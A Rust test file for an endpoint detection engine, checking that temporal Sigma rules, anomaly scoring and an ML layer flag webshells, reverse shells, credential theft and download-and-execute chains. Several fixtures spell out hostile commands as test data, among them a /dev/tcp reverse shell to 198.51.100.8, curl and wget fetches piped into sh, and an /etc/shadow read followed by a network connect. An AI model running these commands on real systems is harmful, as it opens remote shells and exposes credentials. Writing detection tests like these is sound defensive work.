use crate::{Confidence, DetectionEngine, EventClass, MlModel, TelemetryEvent, TemporalEngine};

fn event(ts: i64, class: EventClass, pid: u32, process: &str, parent: &str) -> TelemetryEvent {
    TelemetryEvent {
        ts_unix: ts,
        event_class: class,
        pid,
        ppid: 10,
        uid: 0,
        process: process.to_string(),
        parent_process: parent.to_string(),
        session_id: 1,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: None,
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    }
}

// Exercise the real agent seeds without building the agent-core crate.
fn builtin(name: &str) -> &'static str {
    let source = include_str!("../../agent-core/src/lifecycle/detection_bootstrap.rs");
    let marker = format!("const {name}: &str = r#\"");
    source
        .split_once(&marker)
        .unwrap()
        .1
        .split_once("\"#;")
        .unwrap()
        .0
}

#[test]
fn r2_learned_single_class_baseline_is_quiet_but_new_class_is_anomalous() {
    let mut engine = crate::AnomalyEngine::default();
    engine.set_baseline(
        "worker:supervisor".to_string(),
        [(EventClass::FileOpen, 1.0)].into(),
    );
    for i in 0..1024 {
        let benign = event(i, EventClass::FileOpen, 200, "worker", "supervisor");
        assert!(
            engine.observe(&benign).is_none(),
            "stable window {i} is anomalous"
        );
    }
    let mut detected = false;
    for i in 1024..1152 {
        let changed = event(i, EventClass::NetworkConnect, 200, "worker", "supervisor");
        detected |= engine.observe(&changed).is_some_and(|d| d.high);
    }
    assert!(detected, "new network behavior must remain anomalous");
}

#[test]
fn r2_rule_reload_preserves_new_scoring_config_and_explicit_priors() {
    let mut previous = crate::AnomalyEngine::default();
    previous.set_baseline(
        "worker:supervisor".into(),
        [(EventClass::FileOpen, 1.0)].into(),
    );
    previous.set_baseline(
        "reader:supervisor".into(),
        [(EventClass::FileOpen, 1.0)].into(),
    );
    let mut config = crate::AnomalyConfig::default();
    config.window_size = 16;
    let mut replacement = crate::AnomalyEngine::new(config);
    replacement.set_baseline(
        "worker:supervisor".into(),
        [(EventClass::NetworkConnect, 1.0)].into(),
    );
    replacement.inherit_baselines(&mut previous);
    for i in 0..16 {
        assert!(replacement
            .observe(&event(
                i,
                EventClass::NetworkConnect,
                200,
                "worker",
                "supervisor"
            ))
            .is_none());
        assert!(replacement
            .observe(&event(i, EventClass::FileOpen, 201, "reader", "supervisor"))
            .is_none());
    }
    let mut detected = false;
    for i in 16..32 {
        detected |= replacement
            .observe(&event(i, EventClass::FileOpen, 200, "worker", "supervisor"))
            .is_some_and(|d| d.high);
    }
    assert!(
        detected,
        "explicit replacement prior or new 16-event window was lost"
    );
}

#[test]
fn r2_exit_and_exec_invalidation_are_scoped_to_the_owning_pid() {
    for invalidate_with_exit in [false, true] {
        let mut engine = TemporalEngine::with_default_rules();
        engine.observe(&event(100, EventClass::ProcessExec, 200, "sh", "nginx"));
        engine.observe(&event(101, EventClass::ProcessExec, 201, "sh", "nginx"));
        let class = if invalidate_with_exit {
            EventClass::ProcessExit
        } else {
            EventClass::ProcessExec
        };
        engine.observe(&event(102, class, 200, "other-image", "nginx"));
        let mut connect = event(103, EventClass::NetworkConnect, 200, "sh", "nginx");
        connect.dst_port = Some(4444);
        assert!(!engine.observe(&connect).iter().any(|h| h == "phi_webshell"));
        connect.ts_unix = 104;
        connect.pid = 201;
        assert!(
            engine.observe(&connect).iter().any(|h| h == "phi_webshell"),
            "sibling lost after exit={invalidate_with_exit}"
        );
    }
}

fn seeded(name: &str) -> TemporalEngine {
    let mut engine = TemporalEngine::new();
    engine.add_sigma_rule_yaml(builtin(name)).unwrap();
    engine
}

#[test]
fn audit_same_named_processes_in_daemon_session_do_not_share_network_stages() {
    let mut engine = TemporalEngine::with_default_rules();
    let shell = event(100, EventClass::ProcessExec, 200, "sh", "nginx");
    engine.observe(&shell);
    let mut unrelated = event(101, EventClass::NetworkConnect, 300, "sh", "nginx");
    unrelated.dst_port = Some(6379);
    assert!(!engine
        .observe(&unrelated)
        .iter()
        .any(|hit| hit == "phi_webshell"));
    let mut attack = unrelated;
    attack.ts_unix = 102;
    attack.pid = shell.pid;
    assert!(engine
        .observe(&attack)
        .iter()
        .any(|hit| hit == "phi_webshell"));
}

#[test]
fn audit_background_exec_and_exit_do_not_erase_webshell_or_reverse_shell() {
    for (parent, command, rule) in [
        ("nginx", "sh -c id", "phi_webshell"),
        (
            "sshd",
            "bash -i >& /dev/tcp/198.51.100.8/4444 0>&1",
            "phi_reverse_shell",
        ),
    ] {
        let mut engine = TemporalEngine::with_default_rules();
        let mut shell = event(100, EventClass::ProcessExec, 200, "bash", parent);
        shell.command_line = Some(command.to_string());
        engine.observe(&shell);
        let probe = event(101, EventClass::ProcessExec, 300, "python3", "qemu-ga");
        assert!(engine.observe(&probe).is_empty());
        let exit = event(102, EventClass::ProcessExit, 300, "python3", "qemu-ga");
        assert!(engine.observe(&exit).is_empty());
        let mut connect = event(103, EventClass::NetworkConnect, 200, "bash", parent);
        connect.dst_port = Some(4444);
        assert!(
            engine.observe(&connect).iter().any(|hit| hit == rule),
            "{rule}"
        );
    }
}

#[test]
fn audit_unrelated_file_access_does_not_erase_credential_chain() {
    let mut engine = TemporalEngine::with_default_rules();
    let mut credential = event(100, EventClass::FileOpen, 200, "python3", "sh");
    credential.file_path = Some("/etc/shadow".to_string());
    engine.observe(&credential);
    let mut probe = event(101, EventClass::FileOpen, 300, "df", "qemu-ga");
    probe.file_path = Some("/proc/mounts".to_string());
    assert!(engine.observe(&probe).is_empty());
    let mut connect = event(102, EventClass::NetworkConnect, 200, "python3", "sh");
    connect.dst_port = Some(9001);
    assert!(engine
        .observe(&connect)
        .iter()
        .any(|hit| hit == "phi_credential_exfil"));
}

#[test]
fn audit_reorder_timestamps_are_per_pid_not_daemon_session() {
    let mut engine = TemporalEngine::with_default_rules();
    let shell = event(100, EventClass::ProcessExec, 200, "sh", "nginx");
    engine.observe(&shell);
    let future_probe = event(109, EventClass::ProcessExec, 300, "df", "qemu-ga");
    engine.observe(&future_probe);
    let mut connect = event(105, EventClass::NetworkConnect, 200, "sh", "nginx");
    connect.dst_port = Some(9001);
    assert!(engine
        .observe(&connect)
        .iter()
        .any(|hit| hit == "phi_webshell"));
}

#[test]
fn audit_curl_pipe_shell_wget_then_shell_and_python_os_system_remain_detected() {
    for (process, command, shell_parent, with_exit) in [
        ("curl", "curl https://198.51.100.8/x", "bash", false),
        ("wget", "wget https://198.51.100.8/x -O /tmp/x", "bash", true),
        ("python3", "python3 -c import urllib.request,os; urllib.request.urlretrieve('https://198.51.100.8/x','/tmp/x'); os.system('sh /tmp/x')", "python3", false),
    ] {
        let mut engine = TemporalEngine::with_default_rules();
        let mut downloader = event(100, EventClass::ProcessExec, 200, process, "bash");
        downloader.command_line = Some(command.to_string());
        engine.observe(&downloader);
        if with_exit {
            let exit = event(101, EventClass::ProcessExit, 200, process, "bash");
            engine.observe(&exit);
        }
        let mut shell = event(102, EventClass::ProcessExec, 201, "sh", shell_parent);
        shell.ppid = if shell_parent == "python3" { 200 } else { 10 };
        shell.command_line = Some("sh /tmp/x".to_string());
        assert!(engine.observe(&shell).iter().any(|hit| hit == "phi_download_exec"), "{process}");
    }
}

#[test]
fn audit_sigma_write_intent_rejects_reads_but_detects_writes() {
    for yaml in [
        builtin("SIGMA_PERSISTENCE"),
        "title: write_only\ndetection:\n  sequence:\n    - event_class: file_open\n      file_path_contains: [/etc/cron]\n      require_file_write: true\n      within_secs: 10\n",
    ] {
        let mut engine = TemporalEngine::new();
        let rule = engine.add_sigma_rule_yaml(yaml).unwrap();
        let exec = event(100, EventClass::ProcessExec, 200, "systemctl", "sh");
        engine.observe(&exec);
        let mut read = event(101, EventClass::FileOpen, 200, "systemctl", "sh");
        read.file_path = Some("/etc/systemd/system/backup.service".to_string());
        if rule == "write_only" {
            read.file_path = Some("/etc/cron.d/backup".to_string());
        }
        assert!(!engine.observe(&read).contains(&rule), "read fired {rule}");
        let mut write = read;
        write.ts_unix = 102;
        write.file_write = true;
        assert!(engine.observe(&write).contains(&rule), "write missed {rule}");
    }
}

#[test]
fn audit_builtin_data_exfil_needs_sensitive_file_not_library_read() {
    let mut engine = seeded("SIGMA_DATA_EXFIL");
    let mut file = event(100, EventClass::FileOpen, 200, "python3", "monitoring");
    file.file_path = Some("/usr/lib/python3.12/json/__init__.py".to_string());
    engine.observe(&file);
    let mut connect = event(
        101,
        EventClass::NetworkConnect,
        200,
        "python3",
        "monitoring",
    );
    connect.dst_port = Some(443);
    assert!(engine.observe(&connect).is_empty());
    file.ts_unix = 102;
    file.file_path = Some("/etc/shadow".to_string());
    engine.observe(&file);
    connect.ts_unix = 103;
    assert!(engine
        .observe(&connect)
        .iter()
        .any(|hit| hit == "eguard_builtin_data_exfil"));
}

#[test]
fn audit_builtin_reverse_shell_needs_shell_io_evidence_and_includes_https_port() {
    let mut engine = seeded("SIGMA_REVERSE_SHELL");
    let mut shell = event(100, EventClass::ProcessExec, 200, "bash", "monitoring");
    shell.command_line = Some("bash -c check_health".to_string());
    engine.observe(&shell);
    let mut connect = event(101, EventClass::NetworkConnect, 200, "bash", "monitoring");
    connect.dst_port = Some(9001);
    assert!(engine.observe(&connect).is_empty());
    shell.ts_unix = 102;
    shell.command_line = Some("bash -i >& /dev/tcp/198.51.100.8/443 0>&1".to_string());
    engine.observe(&shell);
    connect.ts_unix = 103;
    connect.dst_port = Some(443);
    assert!(engine
        .observe(&connect)
        .iter()
        .any(|hit| hit == "eguard_builtin_reverse_shell"));
}

#[test]
fn audit_builtin_privesc_does_not_join_arbitrary_user_and_root_daemons() {
    let mut engine = seeded("SIGMA_PRIVESC");
    let mut user = event(
        100,
        EventClass::ProcessExec,
        200,
        "zabbix_agentd",
        "systemd",
    );
    user.uid = 1000;
    engine.observe(&user);
    let root = event(101, EventClass::ProcessExec, 300, "sh", "cron");
    assert!(engine.observe(&root).is_empty());
    user.ts_unix = 102;
    user.process = "sudo".to_string();
    user.parent_process = "sshd".to_string();
    engine.observe(&user);
    let mut elevated = event(103, EventClass::ProcessExec, 201, "sh", "sudo");
    elevated.ppid = 200;
    assert!(engine
        .observe(&elevated)
        .iter()
        .any(|hit| hit == "eguard_builtin_privesc"));
}

#[test]
fn audit_anomaly_and_ml_do_not_make_benign_interpreter_syntax_high() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .layer1
        .load_string_signatures(["python3 -c".to_string()]);
    let mut probe = event(100, EventClass::ProcessExec, 200, "python3", "qemu-ga");
    probe.file_path = Some("/usr/bin/python3.12".to_string());
    probe.command_line = Some("python3 -c 'import string'".to_string());
    for i in 0..512 {
        probe.ts_unix = 100 + i;
        probe.pid = 200 + i as u32;
        let outcome = engine.process_event(&probe);
        assert!(
            outcome.confidence < Confidence::High,
            "default model escalated benign probe {i}: {:?}; signals={:?}; anomaly={:?}; ML={:?}",
            outcome.confidence,
            outcome.signals,
            outcome.anomaly,
            outcome.ml_score
        );
    }

    // The fusion guard must also hold for a server-loaded, overconfident model.
    let mut model = MlModel::default();
    model.weights.fill(0.0);
    model.bias = 5.0; // score=0.993307; intentionally uncalibrated
    engine.layer5.reload_model(model).unwrap();
    for i in 0..128 {
        probe.ts_unix = 1000 + i;
        probe.pid = 1000 + i as u32;
        let outcome = engine.process_event(&probe);
        assert!(
            outcome.confidence < Confidence::High,
            "benign probe escalated: {:?}; signals={:?}; anomaly={:?}; ML={:?}",
            outcome.confidence,
            outcome.signals,
            outcome.anomaly,
            outcome.ml_score
        );
    }
    let mut reverse = event(1200, EventClass::ProcessExec, 2000, "bash", "sshd");
    reverse.command_line = Some("bash -i >& /dev/tcp/198.51.100.8/4444 0>&1".to_string());
    engine.process_event(&reverse);
    let mut connect = event(1201, EventClass::NetworkConnect, 2000, "bash", "sshd");
    connect.dst_port = Some(4444);
    assert!(engine.process_event(&connect).confidence >= Confidence::High);
}

#[test]
fn audit_each_sigma_event_is_observed_once_per_rule() {
    let mut engine = TemporalEngine::new();
    let rule = engine.add_sigma_rule_yaml("title: repeated_exec\ndetection:\n  sequence:\n    - event_class: process_exec\n      process_any_of: [bash]\n      within_secs: 10\n    - event_class: process_exec\n      process_any_of: [bash]\n      within_secs: 10\n").unwrap();
    let first = event(100, EventClass::ProcessExec, 200, "bash", "sh");
    assert!(!engine.observe(&first).contains(&rule));
    let second = event(101, EventClass::ProcessExec, 201, "bash", "bash");
    assert!(engine.observe(&second).contains(&rule));
}
